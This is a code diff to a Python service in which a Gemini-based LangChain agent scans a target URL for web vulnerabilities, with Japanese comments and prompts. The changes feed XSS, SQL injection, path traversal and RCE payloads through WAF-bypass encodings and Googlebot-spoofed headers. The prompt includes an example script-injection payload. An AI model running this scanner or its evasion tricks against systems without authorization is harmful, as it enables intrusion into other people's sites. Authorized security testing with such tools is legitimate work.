@@ -13,6 +13,7 @@ import random
 import string
 import time
 from urllib.parse import quote_plus
+import json # JSONを扱うためにインポート
 
 from langchain_google_genai import ChatGoogleGenerativeAI
 from langchain.agents import AgentExecutor, create_tool_calling_agent
@@ -117,6 +118,7 @@ def generate_rce_payloads() -> List[str]:
 async def send_http_request_with_payload(url: str, method: str, payload_type: str, data: str = None, headers: dict = None) -> str:
     """
     指定されたURLにHTTPリクエストを送信し、複数のWAFバイパス手法を試行しながら脆弱性ペイロードをテストする。
+    'data'引数はキーと値のペアを含むJSON文字列でなければならない。例: '{"q":"some_payload"}'
     """
     bypass_techniques = ["case_obfuscation", "url_encoding", "character_substitution", "add_null_byte"]
     
@@ -126,17 +128,28 @@ async def send_http_request_with_payload(url: str, method: str, payload_type: st
         {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)','Referer': 'https://www.google.com/'}
     ]
 
+    try:
+        # dataがJSON文字列形式であることを確認し、辞書に変換
+        data_dict = json.loads(data) if data else {}
+    except (json.JSONDecodeError, TypeError):
+        return f"Error: The 'data' parameter must be a valid JSON string. Received: {data}"
+        
     async with httpx.AsyncClient() as client:
         try:
-            initial_response = await client.request(method, url, data=data, headers=headers, timeout=15)
+            # WAFバイパスなしの初回リクエスト
+            initial_response_data = {k: v for k, v in data_dict.items()} if data_dict else None
+            initial_response = await client.request(method.upper(), url, data=initial_response_data, headers=headers, timeout=15)
             
+            # WAFバイパス手法を試行
             for technique in bypass_techniques:
                 for bypass_headers in bypass_headers_list:
-                    modified_data = apply_waf_bypass(data, technique) if data else None
+                    # ペイロード値のみにバイパス手法を適用
+                    modified_data_dict = {k: apply_waf_bypass(v, technique) for k, v in data_dict.items()} if data_dict else None
+                    
                     combined_headers = {**(headers or {}), **bypass_headers}
 
                     try:
-                        response_bypass = await client.request(method, url, data=modified_data, headers=combined_headers, timeout=15)
+                        response_bypass = await client.request(method.upper(), url, data=modified_data_dict, headers=combined_headers, timeout=15)
                         
                         if initial_response.status_code in [403, 406, 503] and response_bypass.status_code == 200:
                             return f"WAF Bypass SUCCESS with {technique} and {bypass_headers}! Original request was blocked ({initial_response.status_code}), but bypass was successful ({response_bypass.status_code}). Response Body: {response_bypass.text[:500]}"
@@ -150,7 +163,7 @@ async def send_http_request_with_payload(url: str, method: str, payload_type: st
                                 vulnerability_flags.append("SQLI_ERROR_DETECTED")
                                 
                         if payload_type == "xss":
-                            if modified_data and str(modified_data) in response.text:
+                            if modified_data_dict and any(str(val) in response.text for val in modified_data_dict.values()):
                                 vulnerability_flags.append("XSS_PAYLOAD_REFLECTED")
 
                         if payload_type == "path_traversal" or payload_type == "lfi":
@@ -160,7 +173,7 @@ async def send_http_request_with_payload(url: str, method: str, payload_type: st
                         if payload_type == "ssrf":
                             if re.search(r"10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}", response.text):
                                 vulnerability_flags.append("SSRF_INTERNAL_IP_DETECTED")
-                        
+                            
                         if payload_type == "rce":
                             if re.search(r"uid=\d+\(.*?\)|windows", response.text, re.IGNORECASE):
                                 vulnerability_flags.append("RCE_COMMAND_OUTPUT_DETECTED")
@@ -168,7 +181,7 @@ async def send_http_request_with_payload(url: str, method: str, payload_type: st
                         flags_str = " | ".join(vulnerability_flags) if vulnerability_flags else "No specific vulnerability pattern detected."
                         
                         if vulnerability_flags:
-                             return f"Status Code: {response.status_code}\nFlags: {flags_str}\nResponse Body (Text): {response.text[:500]}"
+                                return f"Status Code: {response.status_code}\nFlags: {flags_str}\nResponse Body (Text): {response.text[:500]}"
                     
                     except httpx.HTTPStatusError as e:
                         print(f"HTTP Error during bypass attempt: {e}")
@@ -223,13 +236,13 @@ async def start_scan(scan_input: ScanInput):
         ("system", "あなたの思考プロセスは以下のステップに従います:"),
         ("system", "1. まず、`detect_waf`ツールを使用して、ターゲットURLにWAFが存在するかどうかを判断します。"),
         ("system", "2. WAFの検出結果とユーザーの入力に基づいて、提供されたペイロードリストから脆弱性タイプごとにテストを開始します。"),
-        ("system", "3. `send_http_request_with_payload`ツールを使用して、各ペイロードをターゲットエンドポイントに送信します。**この時、`method`は'POST'、`payload_type`は該当する脆弱性タイプ（例: 'xss', 'sql_injection', 'path_traversal', 'rce'）、`data`はペイロードをキーと値のペアとして含むJSON文字列（例: '{\"query\":\"<script>alert(\\'XSS\\')</script>\"}'）を生成し、URLエンコードして使用します。**"),
+        ("system", "3. `send_http_request_with_payload`ツールを使用して、各ペイロードをターゲットエンドポイントに送信します。**この時、`method`は'POST'、`payload_type`は該当する脆弱性タイプ（例: 'xss', 'sql_injection'）、`data`はペイロードをキーと値のペアとして含むJSON文字列（例: '{{\"q\":\"<script>alert(\\'XSS\\')</script>\"}}'）を生成して使用します。キー名は`q`や`search`など、一般的で意味のあるものを使用してください。**"),
         ("system", "4. 各リクエストのレスポンスを注意深く分析し、脆弱性の兆候（Flags）を探します。"),
         ("system", "5. すべての脆弱性タイプとすべてのペイロードを試行し終えたら、見つかった脆弱性の詳細と、見つからなかった場合はその旨をまとめた最終報告書を作成します。"),
         ("system", "攻撃ペイロードの生成、応答の分析、報告書の作成はすべてあなたの思考プロセスで行い、必要に応じて適切なツールを呼び出してください。"),
         ("system", "レスポンスの`Flags`に`XSS_PAYLOAD_REFLECTED`、`SQLI_ERROR_DETECTED`、`PATH_TRAVERSAL_CONTENT_DETECTED`、`RCE_COMMAND_OUTPUT_DETECTED`のいずれかが含まれていたら、脆弱性が存在すると判断し、詳細な報告書に含めてください。"),
         MessagesPlaceholder("chat_history"),
-        ("human", "{input}"),
+        ("human", "{query}"), 
         MessagesPlaceholder("agent_scratchpad"),
     ])
     
@@ -250,7 +263,7 @@ async def start_scan(scan_input: ScanInput):
     # --- プロンプトにすべてのペイロードリストを含める ---
     tech_stack_str = ", ".join([f"{item.name} {item.version}" if item.version else item.name for item in scan_input.tech_stack]) if scan_input.tech_stack else "情報なし"
     
-    initial_input = f"""
+    initial_query = f"""
     ターゲットURL: {scan_input.url}
     攻撃対象エンドポイント: {scan_input.target_endpoint}
     技術スタック: {tech_stack_str}
@@ -265,13 +278,11 @@ async def start_scan(scan_input: ScanInput):
     上記情報に基づき、脆弱性スキャンを開始してください。
     """
     try:
-        result = await agent_executor.ainvoke({"input": initial_input})
+        result = await agent_executor.ainvoke({"query": initial_query})
         final_report = result.get('output', '診断中に予期せぬエラーが発生しました。')
         return {"status": "scanning_complete", "final_report": final_report}
     except Exception as e:
         return {"status": "error", "final_report": f"診断中にエラーが発生しました: {e}"}
-
-
 
 # --- ヘルスチェックとフロントエンド (変更なし) ---
 @app.get("/health")
